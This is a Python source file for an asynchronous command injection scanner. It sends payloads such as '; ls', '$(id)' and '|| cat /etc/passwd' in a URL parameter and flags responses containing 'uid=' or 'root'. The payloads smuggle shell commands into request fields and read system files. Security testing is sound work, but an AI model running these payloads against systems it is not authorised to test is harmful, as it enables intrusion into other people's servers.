import asyncio
import aiohttp
from config.config import logger

# Define payloads
CMD_PAYLOADS = [
    "; ls", "&& whoami", "| id", "$(id)", "& echo vulnerable",
    "|| cat /etc/passwd", "|| powershell whoami", "0; id"
]

async def check_command_injection(target_url: str, param: str, payload: str, session: aiohttp.ClientSession) -> dict:
    """Check individual payload and return formatted result"""
    test_url = f"{target_url}?{param}={payload}"
    result = {
        "url": test_url,
        "payload": payload,
        "vulnerable": False
    }
    
    try:
        async with session.get(target_url, params={param: payload}, timeout=5) as response:
            content = await response.text()
            
            # Check for vulnerability indicators
            if any(keyword in content for keyword in ["uid=", "root", "vulnerable", "groups=0"]):
                result["vulnerable"] = True
                logger.warning(f"VULNERABLE: {test_url} with payload '{payload}'")
            else:
                logger.info(f"Clean: {test_url} with payload '{payload}'")
                
    except (aiohttp.ClientError, asyncio.TimeoutError) as e:
        logger.error(f"Request failed for {test_url}: {str(e)}")
    except Exception as e:
        logger.error(f"Unexpected error for {test_url}: {str(e)}")
    
    return result

async def scan_command_injection(target_url: str, param: str) -> dict:
    """Main scanning function using async requests"""
    async with aiohttp.ClientSession() as session:
        tasks = []
        vulnerable_entries = []
        
        for payload in CMD_PAYLOADS:
            task = asyncio.create_task(check_command_injection(target_url, param, payload, session))
            tasks.append(task)
        
        # Gather all results
        results = await asyncio.gather(*tasks)
        
        # Extract vulnerable entries
        for res in results:
            if res.get("vulnerable", False):
                vulnerable_entries.append({
                    "url": res["url"],
                    "payload": res["payload"]
                })
    
    return {
        "status": "success" if vulnerable_entries else "no_vulnerabilities",
        "vulnerable_entries": vulnerable_entries,
        "total_payloads": len(CMD_PAYLOADS),
        "tested_urls": [res["url"] for res in results]
    }

async def run_cmdscan(target_url: str, param: str) -> dict:
    """Entry point for the scan (async)"""
    logger.info(f"Starting command injection scan for {target_url}")
    scan_result = await scan_command_injection(target_url, param)
    logger.info(f"Scan completed. Results: {scan_result}")
    return scan_result

def run_cmdscan_sync(target_url: str, param: str) -> dict:
    """Synchronous wrapper for the scan"""
    return asyncio.run(run_cmdscan(target_url, param))